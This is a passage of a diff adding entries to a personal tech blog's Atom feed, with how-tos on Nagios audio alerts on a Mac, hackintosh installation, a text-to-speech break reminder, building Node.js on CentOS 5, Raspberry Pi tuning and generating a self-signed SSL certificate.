DEFINITION - ITS NOT A REAL CONTACT, JUST A TEMPLATE!</div><div class="line">}</div><div class="line"><span class="keyword">...</span></div></pre></td></tr></table></figure>
+
+<ul>
+<li>Restart nagios server after making the above changes, always test nagios configuration before restarting: <code>/etc/init.d/nagios checkconfig</code></li>
+</ul>
+<h2 id="Run_nagios-audio-server-js_as_a_daemon">Run nagios-audio-server.js as a daemon</h2>
+<p>Rason for this is that we want the Mac to be able to play alerts even when the user is not logged in. Create <code>/System/Library/LaunchDaemons/nagios-audio-alert.plist</code> with the following content, change <code>CHANGE_TO_YOUR_USERNAME_ON_MAC</code> to your mac username</p>
+<figure class="highlight xml"><figcaption><span>/System/Library/LaunchDaemons/nagios-audio-alert.plist</span><a href="/downloads/code/nagios-audio-alert.plist.xml">download</a></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="pi">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></div><div class="line"><span class="doctype">&lt;!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">plist</span> <span class="attribute">version</span>=<span class="value">"1.0"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">dict</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="title">key</span>&gt;</span>Label<span class="tag">&lt;/<span class="title">key</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="title">string</span>&gt;</span>nagios_alert<span class="tag">&lt;/<span class="title">string</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="title">key</span>&gt;</span>UserName<span class="tag">&lt;/<span class="title">key</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="title">string</span>&gt;</span>CHANGE_TO_YOUR_USERNAME_ON_MAC<span class="tag">&lt;/<span class="title">string</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="title">key</span>&gt;</span>ProgramArguments<span class="tag">&lt;/<span class="title">key</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="title">array</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="title">string</span>&gt;</span>/usr/local/bin/node<span class="tag">&lt;/<span class="title">string</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="title">string</span>&gt;</span>/usr/local/bin/nagios.js<span class="tag">&lt;/<span class="title">string</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="title">array</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="title">key</span>&gt;</span>StandardOutPath<span class="tag">&lt;/<span class="title">key</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="title">string</span>&gt;</span>/var/log/nagios_alert.log<span class="tag">&lt;/<span class="title">string</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="title">key</span>&gt;</span>KeepAlive<span class="tag">&lt;/<span class="title">key</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="title">true</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="title">dict</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="title">plist</span>&gt;</span></div></pre></td></tr></table></figure><br>then<br><br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo launchctl load -w <span class="regexp">/System/</span>Library<span class="regexp">/LaunchDaemons/</span>nagios-audio-alert.plist</div></pre></td></tr></table></figure>
+
+<h2 id="Some_notes">Some notes</h2>
+<ul>
+<li>20123 is the UDP port I grabbed from the air, change to whatever port you like (make sure they are in sync in both the js code and nagios config file command.cfg</li>
+<li>Reason why execSync is needed is because if you have two (or more) messages come in at the same time (or almost simultaneously), you want the messages to be played one after another</li>
+<li>If you have filewall on either the client or the nagios server, make sure they allow the traffic for the protocol/port used</li>
+<li>A mac client is not really a hard requirement to build a nagios audio alert system like this, a Linux box that is capable of doing text-to-audio can handle this kind of task with ease, some code in nagios-audio-alert.js need to be changed though</li>
+</ul>
+]]></content>
+    <summary type="html">
+    <![CDATA[<h2 id="Background">Background</h2>
+<p>You have a nagios server running Linux and you have a nice OS at work called Mac OS X which comes wit]]>
+    </summary>
+    
+      <category term="howto" scheme="http://midnightcodr.github.io/categories/howto/"/>
+    
+      <category term="fun" scheme="http://midnightcodr.github.io/categories/howto/fun/"/>
+    
+      <category term="nagios" scheme="http://midnightcodr.github.io/categories/howto/fun/nagios/"/>
+    
+      <category term="node.js" scheme="http://midnightcodr.github.io/categories/howto/fun/nagios/node-js/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[GA-Z68X-UD3H-B3 F12 Mountain Lion 10.8.3 Installation Notes]]></title>
+    <link href="http://midnightcodr.github.io/2013/04/08/ga-z68x-ud3h-b3-f12-mountain-lion-10-dot-8-3-installation-notes/"/>
+    <id>http://midnightcodr.github.io/2013/04/08/ga-z68x-ud3h-b3-f12-mountain-lion-10-dot-8-3-installation-notes/</id>
+    <published>2013-04-09T00:02:00.000Z</published>
+    <updated>2014-11-02T16:41:56.000Z</updated>
+    <content type="html"><![CDATA[<p>Last Friday I had a hard time installing Moutain Lion 10.8.2 onto a GA-Z68X-UD3H-B3 (BIOS version F10), which was running fine with Lion (10.7.3), with either upgrade or clean install method. With some help from <a href="http://www.kakewalk.se/forums/discussion/4008/success-ga-z68x-ud3h-10-8-x-mountain-lion/p1" target="_blank" rel="external">http://www.kakewalk.se/forums/discussion/4008/success-ga-z68x-ud3h-10-8-x-mountain-lion/p1</a> and <a href="http://www.tonymacx86.com/" target="_blank" rel="external">http://www.tonymacx86.com/</a> I managed to install ML 10.8.3 onto the system. Here are the steps:</p>
+<ol>
+<li>Make a 10.8.3 Unibeast bootable usb drive (doesn’t need to check either options when making the drive with Unibeast) </li>
+<li>Upgrade BIOS to F12 (tried UEFI version but got BIOS ID check error hence I settled with F12)</li>
+<li>In BIOS setting, make sure HPET is set to 64bit. The system has an Agility 3 120GB SSD so the SATA3 port mode should be set to ACHI</li>
+<li>After installation, boot from Unibeast drive again but choose the OS on the SSD</li>
+<li>Download DDST (to the desktop), Multibeast from tonymacx86.com, choose the followings (More on the audio later)<img src="/images/z68x-ud3h-b3-f12-ML-10.8.3.png" class="center"></li>
+<li>After Multibeast and Lnx2Mac’s Realtek driver installations, shutdown, remove Unibeast drive and boot from SSD, network should be working but audio is not working (can see the sound icon, can adjust volume but there’s just no sound coming out)</li>
+<li>Download Audio_Network.zip from <a href="http://ge.tt/6nuMCAL/v/0?c" target="_blank" rel="external">http://ge.tt/6nuMCAL/v/0?c</a>, unzip but only place AppleHDA.kext onto the desktop</li>
+<li>Download KextBeast from tonymacx86.com and run it, it should pick up the AppleHDA.kext on the desktop</li>
+<li>Run Multibeast again, select nothing but Drivers &amp; Bootloaders-&gt;Drivers-&gt;Audio-&gt;Realtek ALC8xx-&gt;Without DSDT-&gt;ALC889 (basically the same option for audio in step 5)</li>
+<li>Reboot, audio problem should now be fixed (try different line out port if is sound still missing).</li>
+<li>(Optional) If you need to use iMessage, you need to install the newest Chimera (2.0.1 currently) from <a href="http://www.tonymacx86.com/downloads.php?do=file&amp;id=164" target="_blank" rel="external">http://www.tonymacx86.com/downloads.php?do=file&amp;id=164</a></li>
+</ol>
+<h2 id="other_notes">other notes</h2>
+<p>Trim doesn’t seem to be turned on when I checked the system info, need to spend some time to look into that.</p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>Last Friday I had a hard time installing Moutain Lion 10.8.2 onto a GA-Z68X-UD3H-B3 (BIOS version F10), which was running fine with Lion ]]>
+    </summary>
+    
+      <category term="howto" scheme="http://midnightcodr.github.io/categories/howto/"/>
+    
+      <category term="tip" scheme="http://midnightcodr.github.io/categories/howto/tip/"/>
+    
+      <category term="tony macx86" scheme="http://midnightcodr.github.io/categories/howto/tip/tony-macx86/"/>
+    
+      <category term="hackintosh" scheme="http://midnightcodr.github.io/categories/howto/tip/tony-macx86/hackintosh/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[Cool Audio Reminder Script With MAC OS X's Text-to-speech Feature]]></title>
+    <link href="http://midnightcodr.github.io/2013/01/26/cool-audio-reminder-script-with-mac-os-xs-text-to-speech-feature/"/>
+    <id>http://midnightcodr.github.io/2013/01/26/cool-audio-reminder-script-with-mac-os-xs-text-to-speech-feature/</id>
+    <published>2013-01-26T05:00:00.000Z</published>
+    <updated>2014-11-02T16:41:56.000Z</updated>
+    <content type="html"><![CDATA[<h2 id="Why">Why</h2>
+<p>We know that <a href="http://abcnews.go.com/WN/sitting-long-work-pose-health-danger/story?id=11926874" target="_blank" rel="external">sitting for too long is harmful for our health</a>. My solution to this problem is to set up a friendly reminder using Mac OS X’s speech to text feature, and a bit of programming. So here we go:</p>
+<h2 id="Steps">Steps</h2>
+<p>1). Create a reminder file under your home directory, for example,</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ vi ~/<span class="keyword">break</span>_reminder</div></pre></td></tr></table></figure>
+
+
+<figure class="highlight"><figcaption><span>content of ~/break_reminder</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">Stand up <span class="keyword">and</span> walk around Your_Name.</div><div class="line">Don<span class="comment">'t be lazy Your_Name, I know you can do it.</span></div><div class="line">Stand up now, Your_Name, <span class="keyword">and</span> <span class="keyword">do</span> some exercises.</div><div class="line">Sitting <span class="keyword">for</span> too <span class="built_in">long</span> <span class="keyword">is</span> <span class="keyword">not</span> healthy <span class="keyword">for</span> you Your_Name.</div><div class="line"><span class="keyword">Take</span> a walk, <span class="keyword">get</span> some water Your_Name.</div><div class="line">You need a <span class="built_in">short</span> break Your_Name.</div><div class="line">Don<span class="comment">'t stick your butt to the chair for too long Your_Name.</span></div></pre></td></tr></table></figure>
+
+<p>Obviously change Your_Name to something that you want the voice to call you. This is one that I created, feel free to change the content.</p>
+<p>2). Create the reminder shell script</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ <span class="keyword">vi</span> ~/reminder.<span class="keyword">sh</span></div></pre></td></tr></table></figure>
+
+<p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="shebang">#!/usr/bin/env bash</span></div><div class="line">(( total_lines = $(wc <span class="operator">-l</span> &lt; ~/<span class="keyword">break</span>_reminder) )) &amp;&amp; (( line = <span class="variable">$RANDOM</span> % <span class="variable">$total_lines</span> + <span class="number">1</span> )) &amp;&amp; sed -n <span class="variable">${line}</span>p ~/<span class="keyword">break</span>_reminder|say</div></pre></td></tr></table></figure><br>3). Run some dry tests by running</p>
+<p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bash ~/reminder.sh</div></pre></td></tr></table></figure><br>4). Add the reminder to crontab</p>
+<p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">crontab <span class="operator">-e</span></div></pre></td></tr></table></figure><br>insert the following line:</p>
+<p>0 9-16 <em> </em> 1-5 bash ~/reminder.sh</p>
+<p>This will run the reminder script from 9am to 4pm hourly on the clock Monday through Friday. If you are new to crontab, refer to <a href="http://en.wikipedia.org/wiki/Cron" target="_blank" rel="external">http://en.wikipedia.org/wiki/Cron</a> for more details.</p>
+<h2 id="Notes">Notes</h2>
+<ol>
+<li>I tried putting the meat inside ~/reminder.sh directly into crontab, didn’t work, that’s why this extra script is needed.</li>
+<li>Feel free to change the env from bash to zsh in ~/reminder.sh, I have tested it to work with both bash and zsh.</li>
+<li>Personally I prefer Serena’s voice, you need to download it via these steps: Search for “Dictation &amp; Speech” in the spotlight -&gt; Tick “Text to Speech” -&gt; Tick “Customize”, then “Serena” from System Voice dropdown, you will be prompted to download the voice file if it has not been downloaded before.</li>
+<li>The reminder (break_reminder) and script (reminder.sh) can be found in my github repository: <a href="https://github.com/midnightcodr/break_reminder" target="_blank" rel="external">https://github.com/midnightcodr/break_reminder</a>.</li>
+</ol>
+]]></content>
+    <summary type="html">
+    <![CDATA[<h2 id="Why">Why</h2>
+<p>We know that <a href="http://abcnews.go.com/WN/sitting-long-work-pose-health-danger/story?id=11926874" target="_bla]]>
+    </summary>
+    
+      <category term="fun" scheme="http://midnightcodr.github.io/categories/fun/"/>
+    
+      <category term="health" scheme="http://midnightcodr.github.io/categories/fun/health/"/>
+    
+      <category term="programming" scheme="http://midnightcodr.github.io/categories/fun/health/programming/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[Display Stand DIY]]></title>
+    <link href="http://midnightcodr.github.io/2012/12/30/display-stand-diy/"/>
+    <id>http://midnightcodr.github.io/2012/12/30/display-stand-diy/</id>
+    <published>2012-12-31T01:50:00.000Z</published>
+    <updated>2014-11-02T16:41:56.000Z</updated>
+    <content type="html"><![CDATA[<h2 id="Ideas">Ideas</h2>
+<p>Inspired by <a href="http://lifehacker.com/5872323/diy-ikea-monitor-stand-for-12" target="_blank" rel="external">http://lifehacker.com/5872323/diy-ikea-monitor-stand-for-12</a>, I decided to make a monitor stand that can support 2 LCD monitors.</p>
+<p>I settled down on the following parts:</p>
+<ul>
+<li>The boards: <a href="http://www.ikea.com/us/en/catalog/products/30094629/#/10094630" target="_blank" rel="external">EKBY TRYGGVE softwood shelf</a></li>
+<li>The legs: <a href="http://www.ikea.com/us/en/catalog/products/20049538/#/00054564" target="_blank" rel="external">CAPITA 6” standless stell leg</a></li>
+</ul>
+<p>Since one board needs 6 legs (I wouldn’t try with 4 legs only) I ended up bying 2 boards and 3 packs of legs (12 legs total) so I can make an extra stand for my work place.</p>
+<p>Final material cost (per stand): $25.</p>
+<h2 id="The_making_and_the_result">The making and the result</h2>
+<img src="https://dl.dropbox.com/u/16020214/monitor_stand/monitor_stand_in_the_making.jpg"><br><img src="https://dl.dropbox.com/u/16020214/monitor_stand/monitor_stand_final.jpg">
+]]></content>
+    <summary type="html">
+    <![CDATA[<h2 id="Ideas">Ideas</h2>
+<p>Inspired by <a href="http://lifehacker.com/5872323/diy-ikea-monitor-stand-for-12" target="_blank" rel="external]]>
+    </summary>
+    
+      <category term="DIY" scheme="http://midnightcodr.github.io/categories/DIY/"/>
+    
+      <category term="fun" scheme="http://midnightcodr.github.io/categories/DIY/fun/"/>
+    
+      <category term="monitor stand" scheme="http://midnightcodr.github.io/categories/DIY/fun/monitor-stand/"/>
+    
+      <category term="ikea" scheme="http://midnightcodr.github.io/categories/DIY/fun/monitor-stand/ikea/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[Install node.js v0.8.14 onto Centos 5 howto]]></title>
+    <link href="http://midnightcodr.github.io/2012/11/22/install-node-dot-js-v0-dot-8-14-onto-centos-5-howto/"/>
+    <id>http://midnightcodr.github.io/2012/11/22/install-node-dot-js-v0-dot-8-14-onto-centos-5-howto/</id>
+    <published>2012-11-23T03:04:00.000Z</published>
+    <updated>2014-11-02T16:41:56.000Z</updated>
+    <content type="html"><![CDATA[<p>Installing through Linux binaries with the current newest version (v0.8.14) doesn’t seem to work. Attempting to run “node -v” would give the folowing errors</p>
+<pre><code>node: /lib/libc.so.6: version <span class="smartquote">`GLIBC_2.9'</span> not found (required by node)
+node: /lib/libc.so.6: version <span class="smartquote">`GLIBC_2.6'</span> not found (required by node)
+node: /lib/libc.so.6: version <span class="smartquote">`GLIBC_2.7'</span> not found (required by node)
+</code></pre><p>Therefore the only way to get it installed onto Centos 5.X (which comes with Python 2.4.3 which will fail while compiling node) is through compiling from source code. I am putting together this guide to ensure the installation is painlessly easy as I’ve been through the process a few times. The systems I’ve tested with happened to be both 32bit but I assume the procedures should work with the 64bit system as well, just make sure you download the source files matching the CPU architecture.</p>
+<h2 id="Steps">Steps</h2>
+<p>step 1. build bzip2 from source</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">wget http://bzip.org/<span class="number">1.0</span>.<span class="number">6</span>/bzip2-<span class="number">1.0</span>.<span class="number">6</span>.tar.gz</div><div class="line">tar xpzf bzip2-<span class="number">1.0</span>.<span class="number">6</span>.tar.gz</div><div class="line"><span class="built_in">cd</span> bzip2-<span class="number">1.0</span>.<span class="number">6</span></div><div class="line">make</div><div class="line">make install</div></pre></td></tr></table></figure>
+
+<p>step 2. build Python 2.7</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">wget -O - http://www.python.org/ftp/python/<span class="number">2.7</span>.<span class="number">3</span>/Python-<span class="number">2.7</span>.<span class="number">3</span>.tgz|tar xz</div><div class="line"><span class="built_in">cd</span> Python-<span class="number">2.7</span>.<span class="number">3</span></div><div class="line">./configure</div><div class="line">make</div><div class="line">make install</div></pre></td></tr></table></figure>
+
+<p>step 3. log out and log back in to the system</p>
+<p>step 4. build node 0.8.14</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">wget -O - http://nodejs.org/dist/v0.<span class="number">8.14</span>/node-v0.<span class="number">8.14</span>-linux-x86.tar.gz|tar xz</div><div class="line"><span class="built_in">cd</span> node-v0.<span class="number">8.14</span></div><div class="line">./configure</div><div class="line">make</div><div class="line">make install</div></pre></td></tr></table></figure>
+
+
+<h2 id="Notes">Notes</h2>
+<ol>
+<li>Step 1 is very critical for the installation of the node. Without it, you will get Python error “cannot find module bz2” while running make in step 4;</li>
+<li>The solution provided by this guide will install Python 2.7 onto your system. If you found something broken with your Python programs, make sure you check the $PATH setting, the OS stock version should have python under /usr/bin/python while the compiled version should be /usr/local/bin/python. Adjust the orders of /usr/local/bin and /usr/bin in $PATh setting if needed.</li>
+</ol>
+<h2 id="References">References</h2>
+<p><a href="http://stackoverflow.com/questions/812781/pythons-bz2-module-not-compiled-by-default" target="_blank" rel="external">http://stackoverflow.com/questions/812781/pythons-bz2-module-not-compiled-by-default</a><br><a href="http://nodejs.org/download/" target="_blank" rel="external">http://nodejs.org/download/</a></p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>Installing through Linux binaries with the current newest version (v0.8.14) doesn’t seem to work. Attempting to run “node -v” would give ]]>
+    </summary>
+    
+      <category term="howto" scheme="http://midnightcodr.github.io/categories/howto/"/>
+    
+      <category term="node.js" scheme="http://midnightcodr.github.io/categories/howto/node-js/"/>
+    
+      <category term="centos" scheme="http://midnightcodr.github.io/categories/howto/node-js/centos/"/>
+    
+      <category term="bz2" scheme="http://midnightcodr.github.io/categories/howto/node-js/centos/bz2/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[Three ways to speed up Raspberry Pi]]></title>
+    <link href="http://midnightcodr.github.io/2012/11/11/three-ways-to-speed-up-raspberry-pi/"/>
+    <id>http://midnightcodr.github.io/2012/11/11/three-ways-to-speed-up-raspberry-pi/</id>
+    <published>2012-11-12T00:52:00.000Z</published>
+    <updated>2014-11-02T16:41:56.000Z</updated>
+    <content type="html"><![CDATA[<p>Raspberry Pi is a fun device to play with but sometimes we wish it can be a tad speedier. In this post I will show you how I did to speed up my rpi. I am running Debian on my rpi so some of the methods might not work for you if you are using different distro.</p>
+<h2 id="1-_Overclock">1. Overclock</h2>
+<p>With the newest Debian wheezy, simply run <strong>raspi-config</strong>, then overclock, OK, choose the one that works for you, choose OK. I settled with 900Mhz because once I use 950MHz, come tasks (such as compilings) could not run properly. Also check out <a href="http://www.raspberrypi.org/archives/tag/overclocking" target="_blank" rel="external">http://www.raspberrypi.org/archives/tag/overclocking</a> for more information on overclocking rpi.</p>
+<h2 id="2-_Adjust_memory_split">2. Adjust memory split</h2>
+<p>By default I got only 184MB of usuable RAM for the system because the rest of the 256MB goes to GPU. While you are still at raspi-config’s top menu, choose memory_split. If you run your rpi primarily as a headless server (not running X), just pick the one with the highest system RAM option (240), OK.</p>
+<p><strong><em>Note</em></strong>: method 1 and 2 require restart to take effect.</p>
+<h2 id="3-_Find_out_auto-start_services_and_de-select_those_that_don’t_need_to_auto-start">3. Find out auto-start services and de-select those that don’t need to auto-start</h2>
+<p>For example, if you only need mysql server once a while, it makes no sense to make it run when rpi boots. A simple way to find out what processes are started during boot is through a program <strong>sysv-rc-conf</strong> (not installed by default). Install and fire it up through:</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo apt-<span class="built_in">get</span> install sysv-rc-<span class="keyword">conf</span></div><div class="line">sudo sysv-rc-<span class="keyword">conf</span></div></pre></td></tr></table></figure>
+
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>Raspberry Pi is a fun device to play with but sometimes we wish it can be a tad speedier. In this post I will show you how I did to speed]]>
+    </summary>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[Generate SSL certificate with 1 easy step]]></title>
+    <link href="http://midnightcodr.github.io/2012/10/10/generate-ssl-certificate-with-1-easy-step/"/>
+    <id>http://midnightcodr.github.io/2012/10/10/generate-ssl-certificate-with-1-easy-step/</id>
+    <published>2012-10-11T02:22:00.000Z</published>
+    <updated>2014-11-02T16:41:56.000Z</updated>
+    <content type="html"><![CDATA[<p>Originally I created a post on how to generate ssl certificate with one simple step:<br><a href="http://ricochen.wordpress.com/2010/01/01/generate-ssl-certificate-in-1-quick-step/" target="_blank" rel="external">http://ricochen.wordpress.com/2010/01/01/generate-ssl-certificate-in-1-quick-step/</a></p>
+<p>I am here to document the procedure in this first post of my Octopress based blog.</p>
+<p>Command to generate SSL certificate (and its associated private key) is pretty straight-forward:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ openssl req -new -x509 -days <span class="number">3650</span> -keyout key.pem -out cert.pem -newkey rsa:<span class="number">2048</span> -subj <span class="string">"/CN=hostname.example.org"</span></div></pre></td></tr></table></figure>
+
+<p>If a password is created in the above step, you’ll need one extra step to remove it unless you want to type the password everytime you restart the web server:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ openssl rsa -in key.pem -out key.pem</div></pre></td></tr></table></figure>
+
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>Originally I created a post on how to generate ssl certificate with one simple step:<br><a href="http://ricochen.wordpress.com/2010/01/01]]>
+    </summary>
+    
+      <category term="SSL" scheme="http://midnightcodr.github.io/categories/SSL/"/>
+    
+      <category term="openssl" scheme="http://midnightcodr.github.io/categories/SSL/openssl/"/>
+    
+  </entry>
+  
+</feed>
